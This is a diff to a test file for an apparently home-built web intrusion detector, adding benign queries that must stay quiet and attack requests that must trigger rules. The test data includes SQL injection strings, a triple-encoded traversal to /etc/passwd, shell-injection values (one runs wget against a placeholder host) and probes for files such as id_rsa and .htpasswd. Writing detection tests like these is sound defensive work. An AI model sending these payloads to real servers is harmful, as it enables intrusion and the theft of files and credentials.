@@ -191,7 +191,7 @@ def test_separate_alert_per_client_and_rule():
 
 
 def test_one_event_can_hit_multiple_rules():
-    a = run(ev("/f?p=../../../../etc/passwd;cat+x", ua="sqlmap/1.0"))
+    a = run(ev("/f?p=../../../../etc/passwd;cat+/tmp/x", ua="sqlmap/1.0"))
     assert {"SIG-TRAVERSAL", "SIG-CMDI", "SIG-UA-SCANNER"} <= ids(a)
 
 
@@ -224,3 +224,53 @@ def test_never_raises_on_odd_input():
     assert det.feed(None) == []
     assert det.feed(ev("/" + "%" * 5000 + "${" * 3000, ua="x" * 100000)) == []
     det.flush()
+
+
+# ---- phase 2 fixes -----------------------------------------------------------
+
+@pytest.mark.parametrize("t", [
+    "/search?q=amazon+%7C+echo+dot",
+    "/search?q=dog+%26%26+cat+toys",
+    "/api/items?fields=name;id",
+    "/search?q=baby+sleep+(8+hours)+guide",
+    "/search?q=%22red+scarf%22+--+wool",
+    "/downloads/db.zip",
+    "/search?q=car.old",
+    "/search?q=win.ini+file+help",
+    "/search?q=etc+passwd+file+help",
+])
+def test_phase2_benign_quiet(t):
+    assert run(ev(t, status=200)) == []
+
+
+@pytest.mark.parametrize("t,rule", [
+    ("/products?id=1+AND+1%3DCONVERT(int,@@version)", "SIG-SQLI"),
+    ("/products?id=1+ORDER+BY+10--", "SIG-SQLI"),
+    ("/products?id=1+AND+1=2", "SIG-SQLI"),
+    ("/u?n=admin'--", "SIG-SQLI"),
+    ("/i?id=1;select+benchmark(1000000,md5(1))", "SIG-SQLI"),
+    ("/i?id=1;waitfor+delay+'0:0:5'", "SIG-SQLI"),
+    ("/download?file=%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd", "SIG-TRAVERSAL"),
+    ("/p?h=a;cat+/etc/hosts", "SIG-CMDI"),
+    ("/p?h=a;id;", "SIG-CMDI"),
+    ("/p?h=a|uname+-a", "SIG-CMDI"),
+    ("/p?h=x;wget+http://x.test/a", "SIG-CMDI"),
+    ("/p?h=`id`", "SIG-CMDI"),
+    ("/actuator/env", "SIG-SENSITIVE-PATH"),
+    ("/actuator/heapdump", "SIG-SENSITIVE-PATH"),
+    ("/web.config", "SIG-SENSITIVE-PATH"),
+    ("/phpmyadmin/", "SIG-SENSITIVE-PATH"),
+    ("/id_rsa", "SIG-SENSITIVE-PATH"),
+    ("/cgi-bin/test-cgi", "SIG-SENSITIVE-PATH"),
+    ("/.htpasswd", "SIG-SENSITIVE-PATH"),
+    ("/.DS_Store", "SIG-SENSITIVE-PATH"),
+    ("/config.json.bak", "SIG-SENSITIVE-PATH"),
+    ("/backup/db.zip", "SIG-SENSITIVE-PATH"),
+])
+def test_phase2_detections(t, rule):
+    assert rule in ids(run(ev(t)))
+
+
+def test_normalize_triple_and_cap():
+    assert normalize("%25252e") == "."
+    assert normalize("%2525252525252e") != "."  # capped at 4 passes
